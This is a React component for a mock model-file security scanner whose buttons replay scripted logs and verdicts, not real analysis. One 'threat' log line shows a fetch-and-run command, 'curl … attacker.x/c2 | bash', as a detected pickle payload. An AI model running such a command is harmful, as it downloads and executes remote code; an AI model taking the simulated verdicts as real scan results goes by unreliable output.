import React, { useState } from 'react';
import { soundFX } from '../utils/audio';

export default function ScannerModal({ isOpen, onClose }) {
  const [logs, setLogs] = useState([
    { text: '[INIT] Vigilant zero-detonation parser initialized.', type: 'info' },
    { text: '[READY] Awaiting model header & tensor dictionary payload...', type: 'normal' }
  ]);
  const [verdict, setVerdict] = useState(null); // { type: 'danger'|'safe', text: string }

  if (!isOpen) return null;

  const runSimulation = (scenario) => {
    soundFX.scan();
    setVerdict(null);
    setLogs([{ text: '[STREAM] Reading binary headers into non-executable ring buffer...', type: 'info' }]);

    setTimeout(() => {
      soundFX.click();
      setLogs(prev => [...prev, { text: '[AST] Deconstructing object serialization graph without python runtime...', type: 'normal' }]);
    }, 350);

    setTimeout(() => {
      if (scenario === 'threat') {
        soundFX.alert();
        setLogs(prev => [
          ...prev,
          { text: '[OPCODE] Discovered GLOBAL opcode: __builtin__.eval()', type: 'warn' },
          { text: '[BYTECODE] Extracted argument string: "curl -s http://attacker.x/c2 | bash"', type: 'danger' },
          { text: '[ALERT] Malicious __reduce__ payload detected in weights layer.12.bias', type: 'danger' }
        ]);
        setTimeout(() => {
          setVerdict({
            type: 'danger',
            text: '🚨 CRITICAL: Malicious RCE Backdoor Intercepted (Detonations: 0)'
          });
        }, 350);
      } else if (scenario === 'stager') {
        soundFX.alert();
        setLogs(prev => [
          ...prev,
          { text: '[TENSOR] Inspecting float16 quantization layer distribution...', type: 'info' },
          { text: '[HEURISTIC] Anomaly detected: Steganographic payload hidden in low-significance bits', type: 'warn' },
          { text: '[SANDBOX] Trigger phrase embedded in attention key-value projection', type: 'danger' }
        ]);
        setTimeout(() => {
          setVerdict({
            type: 'danger',
            text: '⚠️ SUSPICIOUS: Neural Trojan Trigger Injected (Score: 98.4%)'
          });
        }, 350);
      } else {
        soundFX.clean();
        setLogs(prev => [
          ...prev,
          { text: '[VERIFY] SafeTensors cryptographic header validated.', type: 'info' },
          { text: '[BOUNDS] All 142 tensor offsets map to safe contiguous host memory.', type: 'info' },
          { text: '[SCAN] 0 executable opcodes. 0 network calls. Clean model weights.', type: 'success' }
        ]);
        setTimeout(() => {
          setVerdict({
            type: 'safe',
            text: '🛡️ CLEAN: Model is 100% Zero-Detonation Verified'
          });
        }, 350);
      }
    }, 800);
  };

  return (
    <div
      style={{
        position: 'fixed',
        inset: 0,
        zIndex: 100,
        background: 'rgba(3, 7, 9, 0.88)',
        backdropFilter: 'blur(20px)',
        WebkitBackdropFilter: 'blur(20px)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '1.5rem'
      }}
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
    >
      <div
        style={{
          width: '100%',
          maxWidth: '820px',
          background: 'var(--void-elevated)',
          border: '1px solid var(--border-glass)',
          borderRadius: '16px',
          boxShadow: '0 25px 80px rgba(0,0,0,0.8), 0 0 50px rgba(93,228,224,0.12)',
          overflow: 'hidden',
          display: 'flex',
          flexDirection: 'column'
        }}
      >
        {/* Header */}
        <div
          style={{
            padding: '1.1rem 1.5rem',
            borderBottom: '1px solid var(--border-glass)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            background: 'rgba(93, 228, 224, 0.03)'
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.8rem', fontFamily: '"JetBrains Mono", monospace', fontSize: '0.88rem', color: 'var(--ink)' }}>
            <span style={{ color: 'var(--signal)', fontSize: '1.1rem' }}>◎</span>
            <span>VIGILANT // STATIC MODEL INSPECTION CONSOLE</span>
          </div>
          <button
            onClick={() => { soundFX.close(); onClose(); }}
            style={{
              background: 'none',
              border: '1px solid rgba(255,255,255,0.15)',
              color: 'var(--ink-dim)',
              width: '32px',
              height: '32px',
              borderRadius: '8px',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}
          >
            ✕
          </button>
        </div>

        {/* Body */}
        <div style={{ padding: '1.6rem', display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
          {/* Dropzone */}
          <div
            onClick={() => runSimulation('threat')}
            style={{
              border: '2px dashed rgba(93, 228, 224, 0.35)',
              borderRadius: '12px',
              padding: '2rem 1.5rem',
              textAlign: 'center',
              background: 'rgba(93, 228, 224, 0.02)',
              cursor: 'pointer',
              transition: 'all 0.2s'
            }}
          >
            <div style={{ color: 'var(--signal)', fontSize: '2rem', marginBottom: '0.4rem' }}>⇪</div>
            <div style={{ fontSize: '1.05rem', color: 'var(--ink)', fontWeight: 500, marginBottom: '0.3rem' }}>
              Drop model weights here or select a verified test file
            </div>
            <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.78rem', color: 'var(--ink-muted)' }}>
              Supported: .safetensors, .pt, .bin, .gguf, .onnx (Max 128 GB)
            </div>
          </div>

          {/* Sample Buttons */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', flexWrap: 'wrap' }}>
            <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.75rem', color: 'var(--ink-muted)' }}>
              TEST SAMPLES:
            </span>
            <button
              onClick={() => runSimulation('threat')}
              style={{
                fontFamily: '"JetBrains Mono", monospace',
                fontSize: '0.78rem',
                background: 'rgba(255,255,255,0.04)',
                border: '1px solid rgba(255,255,255,0.15)',
                color: 'var(--ink-dim)',
                padding: '0.45rem 0.8rem',
                borderRadius: '6px',
                cursor: 'pointer'
              }}
            >
              🚨 ResNet50_Trojan_Backdoor.pt
            </button>
            <button
              onClick={() => runSimulation('clean')}
              style={{
                fontFamily: '"JetBrains Mono", monospace',
                fontSize: '0.78rem',
                background: 'rgba(255,255,255,0.04)',
                border: '1px solid rgba(255,255,255,0.15)',
                color: 'var(--ink-dim)',
                padding: '0.45rem 0.8rem',
                borderRadius: '6px',
                cursor: 'pointer'
              }}
            >
              🛡️ Mistral_7B_Instruct.safetensors
            </button>
            <button
              onClick={() => runSimulation('stager')}
              style={{
                fontFamily: '"JetBrains Mono", monospace',
                fontSize: '0.78rem',
                background: 'rgba(255,255,255,0.04)',
                border: '1px solid rgba(255,255,255,0.15)',
                color: 'var(--ink-dim)',
                padding: '0.45rem 0.8rem',
                borderRadius: '6px',
                cursor: 'pointer'
              }}
            >
              ⚠️ LLaMA3_HiddenPickleRCE.bin
            </button>
          </div>

          {/* Console stream */}
          <div
            style={{
              background: '#020507',
              border: '1px solid rgba(93,228,224,0.15)',
              borderRadius: '8px',
              padding: '1rem',
              fontFamily: '"JetBrains Mono", monospace',
              fontSize: '0.78rem',
              height: '190px',
              overflowY: 'auto',
              lineHeight: 1.6,
              color: 'var(--ink-dim)'
            }}
          >
            {logs.map((log, i) => {
              let color = 'var(--ink-dim)';
              if (log.type === 'info') color = 'var(--signal)';
              if (log.type === 'warn') color = 'var(--warning)';
              if (log.type === 'danger') color = 'var(--alert)';
              if (log.type === 'success') color = 'var(--success)';
              return (
                <div key={i} style={{ color, marginBottom: '0.2rem', fontWeight: log.type === 'danger' || log.type === 'success' ? 600 : 400 }}>
                  {log.text}
                </div>
              );
            })}
          </div>

          {/* Verdict Banner */}
          {verdict && (
            <div
              style={{
                padding: '0.9rem 1.25rem',
                borderRadius: '8px',
                fontFamily: '"JetBrains Mono", monospace',
                fontSize: '0.85rem',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                background: verdict.type === 'danger' ? 'rgba(255, 74, 74, 0.12)' : 'rgba(56, 239, 125, 0.1)',
                border: `1px solid ${verdict.type === 'danger' ? 'var(--alert)' : 'var(--success)'}`,
                color: verdict.type === 'danger' ? '#ff9a9a' : '#8affbc'
              }}
            >
              <span>{verdict.text}</span>
              <span style={{ textDecoration: 'underline', cursor: 'pointer', fontSize: '0.78rem' }}>
                {verdict.type === 'danger' ? 'QUARANTINE ARTIFACT' : 'DOWNLOAD SIGNED SPEC'}
              </span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

